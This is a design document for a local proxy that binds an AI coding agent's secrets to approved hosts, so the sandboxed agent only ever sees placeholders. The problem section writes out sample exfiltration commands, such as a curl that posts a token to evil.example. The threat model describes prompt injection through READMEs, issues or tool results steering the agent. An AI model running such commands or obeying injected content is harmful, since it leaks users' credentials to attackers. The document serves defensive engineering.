# Design: binding secrets to their destinations

Status: draft, 2026-11-10, updated 2026-11-11. Milestones 1 and 2 are built.

## The problem

Today `secret-exec.sh` swaps `{{NAME}}` for the real value inside a command the model wrote, runs it in the sandbox, and redacts the output by exact string match. That keeps a value out of the transcript when everything goes as intended. It does not hold up once the model is working against you, which is the case prompt injection creates. All of these get the value out today:

```bash
secret-exec.sh 'echo {{TOKEN}} | base64'                  # redaction only matches the raw value
secret-exec.sh 'echo {{TOKEN}} > out.txt'                 # then read the file some other way
secret-exec.sh 'curl https://evil.example -d {{TOKEN}}'   # the sandbox allows all outbound traffic
```

The root cause is that the real value enters a process whose behavior the model controls. Better redaction can't fix that, because the model can always transform the value in a way the redactor didn't predict.

## The idea

Stop putting the real value into the command at all.

A sandboxed command only ever holds the placeholder, `{{GITLAB_TOKEN}}`, as plain text. Its network traffic has to go through a local proxy that runs outside the sandbox. The proxy swaps the placeholder for the real value only when the request goes to a host the secret's policy allows, and only in the header the policy names.

So the model can do whatever it likes with the placeholder. It can base64 it, write it to a file, or post it to evil.example, and all the attacker gets is the string `{{GITLAB_TOKEN}}`. The value only exists on the wire, between the proxy and the host it belongs to.

```
 sandbox (model-controlled)            outside the sandbox
 ┌──────────────────────────┐   ┌─────────────────────────────────┐
 │ curl -H "PRIVATE-TOKEN:  │   │ blindfold proxy                 │
 │   {{GITLAB_TOKEN}}" ...  │──▶│ 1. host allowed for this secret?│──▶ gitlab.com
 │                          │   │ 2. swap placeholder in header   │    (real TLS)
 │ all other egress denied  │   │ 3. scrub value from response    │
 └──────────────────────────┘   │ 4. write audit line             │
                                └─────────────────────────────────┘
```

## Goals

- A secret only ever reaches the destinations its policy names.
- No process the model wrote a command for holds a real value, for HTTP(S) use.
- Every use of a secret is logged.
- Risky uses can require a person to approve them.
- Commands look like normal commands. `curl`, `gh`, `glab` and SDKs keep working.
- macOS first.

## Non-goals for the first version

- Website logins (filling a password into a page). That needs a different mechanism.
- Databases, SSH and other non-HTTP protocols. These keep using `secret-exec.sh`, which stays as a weaker fallback and says so.
- Linux and Windows parity.
- Shared team policies and a central audit sink.
- Defending against other malware already running as the same user. That process could ask the keychain directly.

## Threat model

The attacker is content the agent reads, such as a README, an issue, a web page or a tool result. That content can get the agent to run any command the sandbox allows.

Trusted: the user, the OS, the keychain, and Blindfold's own code running outside the sandbox.

What we protect: the secret values, and the ability to use them anywhere other than where they belong.

## Policy file

Policies live in `~/.config/blindfold/policy.toml` (global) and `.blindfold.toml` in a project root. They hold names and rules, never values.

```toml
[secrets.GITLAB_TOKEN]
hosts   = ["gitlab.com"]
header  = "PRIVATE-TOKEN"
approve = "writes"                 # never | writes | always

[secrets.OPENAI_API_KEY]
hosts  = ["api.openai.com"]
header = "Authorization"           # the client sends "Bearer {{OPENAI_API_KEY}}"

[secrets.REGISTRY_PASSWORD]
hosts      = ["registry.example.com"]
basic_auth = { username = "deploy-bot" }

[secrets.MAPS_KEY]
hosts = ["maps.googleapis.com"]
query = "key"                      # for APIs that only take the key as a query parameter
```

Hosts are exact. Wildcards are refused for now, since `*.github.io` or `*.ngrok.app` would hand the secret to anyone who can create a subdomain.

The value goes in one place: the named header, basic auth, or the named query parameter. The proxy replaces the placeholder inside whatever the client put in that slot, so `Bearer {{OPENAI_API_KEY}}` needs no extra setting. It never substitutes inside a request body. If it did, an agent could write the secret into a GitLab issue on an allowed host and read it back.

A project policy is untrusted until you approve it. It sits in the repo, which means a cloned repo can ship one and the agent can edit one. So the first time the guard sees a project policy, or sees it change, it refuses the command and starts a native dialog in the background showing the file. The dialog can't run inside the hook, because Claude Code gives a hook five seconds. Approving stores an exact copy in `~/.config/blindfold/private/trusted/`, and the proxy only uses a project policy while the file still matches that copy byte for byte, which means bash never has to compute a hash, and a version you didn't see can't ride on one you approved. An unapproved policy is ignored, not half-applied. A project policy also can't change the rule for a secret the global policy names.

The proxy is shared, so it needs to know which project a request comes from. Once a project has a policy, the guard gives it a random token and puts it in the proxy URL as a password (`http://blindfold:TOKEN@127.0.0.1:PORT`). Tokens live in `~/.config/blindfold/private/`, which the egress profile won't let commands read, and the guard keeps Read and Grep out of it. A request without a valid token gets the global policy only. The sandbox also denies writes to `.blindfold.toml` and `~/.config/blindfold/`, so the agent can't quietly edit either one. Claude's Write and Edit tools run outside the sandbox, so the guard hook refuses them on those paths too, after resolving symlinks and `..`, and refuses a hard link whose other name is inside those folders. The write rule sits only in the egress profile: macOS won't apply a profile with file rules inside another sandbox, and the base profile has to keep working inside Claude Code's.

A secret with no policy can't go through the proxy at all. It can only be used through the old `secret-exec.sh` path, which warns about it.

## How a request works

1. The guard hook wraps the command in Seatbelt as it does today. It also sets:
   - `HTTPS_PROXY` and `HTTP_PROXY` to the proxy's local address.
   - `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE` and `NODE_EXTRA_CA_CERTS` to a bundle with the system roots plus Blindfold's local CA.
   - For each secret with a policy, an environment variable such as `GITLAB_TOKEN={{GITLAB_TOKEN}}`, so tools that read their token from the environment send the placeholder without being told to.
2. The sandbox profile denies all outbound network traffic except to the proxy's port on localhost. A tool that ignores proxy settings fails, which is the safe way to fail.
3. The client sends `CONNECT gitlab.com:443`.
   - If no policy names that host, the proxy opens a plain tunnel and never looks inside. Ordinary traffic like `npm install` works as before. Nothing sensitive can leak this way, because a placeholder is worthless to anyone except the proxy.
   - If a policy names the host, the proxy terminates TLS with a certificate for that host, signed by the local CA.
4. For each request inside that connection, the proxy checks four things: the CONNECT host matches the policy, the `Host` header matches the CONNECT host, the method is allowed, and approval has been given if needed. Then it replaces the placeholder in the named header and forwards the request to the real host. It verifies the real host's certificate normally.
5. On the way back, the proxy replaces any copy of the value in the response headers and body with the placeholder. That covers APIs that echo the token back. To make this possible, it strips `Accept-Encoding` from requests it injects into, so responses come back uncompressed.
6. Redirects aren't followed with the secret attached. If the client follows a redirect to another host, that's a new request, and the policy is checked again from scratch.
7. One JSON line is written to the audit log.

## Local CA

- Made in memory when the proxy starts, and made again whenever the set of policy hosts changes. The key is never written anywhere, so there's nothing for the sandbox to read. The cost is that a command already running when the CA changes keeps the old one until it restarts.
- The CA is only trusted through the environment variables above, inside the sandbox. It is **never** added to the system trust store.
- X.509 name constraints limit the CA itself to the policy hosts and exclude every IP address, so even a leaked key couldn't vouch for another site.
- Leaf certificates are only issued for hosts named in the policy. A request for any other host never gets a forged certificate.

## Approvals

`approve = "writes"` asks before any method other than `GET` and `HEAD`. `approve = "always"` asks before every request.

The proxy shows a native dialog. For example: "An agent wants to use GITLAB_TOKEN for POST gitlab.com/api/v4/projects/42/issues". The options are:

- Allow once
- Allow this secret, host and method for 30 minutes
- Deny

No answer within 60 seconds counts as a deny. The 30-minute grant is what keeps this from becoming a wall of prompts people click through without reading.

## Audit log

Each line in `~/.local/state/blindfold/audit.jsonl` looks like this:

```json
{"ts":"2026-11-10T16:40:02Z","secret":"GITLAB_TOKEN","session":"<hook session_id>","method":"POST","host":"gitlab.com","path":"/api/v4/projects/42/issues","status":201,"decision":"approved-session"}
```

Query strings are left out of `path`, because they can carry data. Denied attempts are logged too: wrong host, wrong method, no policy, approval refused. Those are the lines someone investigating an incident will want most. Hash-chaining the log can come later.

## What stays the same

- Secrets are still stored in the keychain through the native dialog. The registry is unchanged.
- `secret-exec.sh` still works for non-HTTP uses. When a secret has a policy, `secret-exec.sh` refuses to substitute it and points to the proxy path instead. A setting can turn that refusal off while people migrate.
- The guard hook still does the wrapping. Later, a `blindfold run -- <agent>` command could wrap the whole agent process instead, so it covers every tool and works with agents other than Claude Code.

## Implementation

The proxy has to terminate TLS and handle HTTP/1.1 and HTTP/2, which bash can't do. It's a small Go program: the standard library covers TLS, HTTP/2 and reverse proxying, and it ships as one static binary through GitHub releases and Homebrew. This is the start of the `blindfoldd` service. The bash scripts keep doing what they do now.

The guard hook starts the proxy on first use if it isn't running. The proxy listens on a random localhost port and writes the port to `~/.config/blindfold/run/proxy.port` (mode 600).

Milestones, each one shippable on its own:

1. Lock down outbound traffic. Seatbelt denies everything except the proxy, and the proxy only tunnels, with no injection yet. I want to know how much breaks with everyday tools before building anything on top of it. If half of `npm`, `pip` and `git` stop working, that changes the plan.
2. Injection: the policy file, the approval dialog for project policies, the local CA, and header, basic-auth and query injection.
3. Response scrubbing and the audit log.
4. Approvals.
5. Migration. `secret-exec.sh` refuses secrets that have a policy, SKILL.md teaches the new pattern, and the README and SECURITY.md get rewritten.

## Testing

The tests are written as attacks. Each one runs a real command through the guard and the proxy against local fake servers with their own certificates. Each asserts that the real value never arrives at the attacker's fake server:

- Placeholder sent to a host no policy names, raw and base64-encoded.
- Placeholder in the request body to an allowed host.
- Redirect from an allowed host to an attacker host.
- `Host` header that doesn't match the CONNECT target.
- An allowed host whose response echoes the token back.
- Writing to `.blindfold.toml` or `~/.config/blindfold/` from inside the sandbox.
- A project policy that adds a new host without being approved.
- A tool that ignores `HTTPS_PROXY` and tries to connect directly.
- DNS lookups from inside the sandbox.

## Known limits

- Tools that pin certificates won't accept the local CA. They fail rather than leak, but they fail.
- Go programs on macOS, `gh` among them, ignore `SSL_CERT_FILE` and only trust the system store, so they fail against policy hosts the same way. Fixing that would mean trusting the CA system-wide, which this design rules out.
- The proxy only offers HTTP/1.1 to clients on intercepted connections. Every client handles it; HTTP/2 can come later.
- Tools that check a token's format locally (for example, expecting a `glpat-` prefix) may reject `{{GITLAB_TOKEN}}`. A per-secret `placeholder` setting that looks like a real token is one way around this.
- An allowed host can still be misused. The proxy stops the secret from going anywhere else, but it doesn't stop an agent from making an allowed and unwanted call, like deleting a project. That's what approvals and narrowly scoped tokens are for. This is the limit I'd most want users to understand.
- Other processes running as the same user, outside the sandbox, can use the proxy too. They still only get injection toward allowed hosts, and they never see the value.

## Alternatives considered

Smarter redaction, catching base64, hex and URL-encoded copies of the value. It's an arms race the redactor loses, because any reversible transform works and there are endless ones.

Only allowing fixed command templates through `secret-exec.sh`. Safe, but so limiting that people would turn it off.

Relying on the agent's own sandbox with a network allowlist. That limits where traffic can go, but the value still sits in the process, so any allowed host that accepts user content, like an issue tracker or a paste site, becomes a way out.

Leaving it to a password manager. 1Password and others already do parts of this, but each one ties you to its vault and usually to particular agents. Blindfold should work with whatever vault and agent you already use, and that's the reason to build this rather than point people elsewhere.

## Open questions

- Placeholder format for tools that check token shape locally.
- Whether to allow wildcard hosts with a confirmation step, or never. My lean is never, at least until someone shows a real API that needs it.
- WebSockets and gRPC through the proxy.
- The Linux sandbox: bubblewrap plus a network namespace, or Landlock.
- Whether the proxy should run as a launchd agent or start per session.
